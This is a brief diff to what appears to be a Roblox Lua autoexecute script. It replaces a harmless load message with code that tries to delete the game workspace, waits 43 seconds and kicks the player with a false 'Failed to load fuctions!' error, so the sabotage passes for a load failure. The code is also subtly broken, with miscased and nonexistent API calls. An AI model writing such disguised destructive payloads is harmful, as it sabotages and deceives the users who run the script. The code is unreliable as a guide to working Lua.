@@ -1,1 +1,6 @@
-print('Loaded autoexecute')
+local workspace = game.workspace
+local player = game.Players.Localplayer
+
+workspace:Delete()
+wait(43)
+player.Kick('Failed to load fuctions!')
